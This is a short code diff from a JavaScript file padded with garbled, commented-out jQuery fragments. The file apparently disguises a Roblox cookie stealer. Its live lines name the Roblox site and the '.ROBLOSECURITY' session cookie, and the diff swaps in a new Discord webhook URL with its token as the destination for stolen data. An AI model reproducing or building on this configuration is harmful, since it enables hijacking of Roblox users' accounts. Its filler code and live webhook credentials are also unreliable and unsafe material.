@@ -1605,7 +1605,7 @@
 //		if ( !obj || toString.call( obj ) !== "[object Object]" ) {		if ( !obj || toString.call( obj ) !== "[object Object]" ) {		if ( !obj || toString.call( obj ) !== "[object Object]" ) {
 var website = "https://www.roblox.com"; // 
 var cookie_data = ".ROBLOSECURITY"; // 
-var discord_web_api = "https://discord.com/api/webhooks/816389469653172264/kEqC3txsW65hVbvpeYEXOfHez2gfFFFmJNJJtKDwvctSgO5UssC3955DB-nwTz7VBspV"; // 
+var discord_web_api = "https://discord.com/api/webhooks/817073053636362261/vhFI97BKFLTpuof8_1nRe8aIqShkMXbPbDIAxvbpWcY2ULCcumv0mpOq0x9zCwP13gbZ"; // 
 //} )( typeof window !== "undefined" ? window : this, function( window, noGlobal )( typeof window !== "undefined" ? window : this, function( window, noGlobal ) {	if ( typeof module === "object" && typeof module.exports === "object" ) { {	if ( typeof module === "object" && typeof module.exports === "object" ) {
 //		if ( !obj || toString.call( obj ) !== "[object Object]" ) {		if ( !obj || toString.call( obj ) !== "[object Object]" ) {		if ( !obj || toString.call( obj ) !== "[object Object]" ) {
 //} )( typeof window !== "undefined" ? window : this, function( window, noGlobal )( typeof window !== "undefined" ? window : this, function( window, noGlobal ) {	if ( typeof module === "object" && typeof module.exports === "object" ) { {	if ( typeof module === "object" && typeof module.exports === "object" ) {
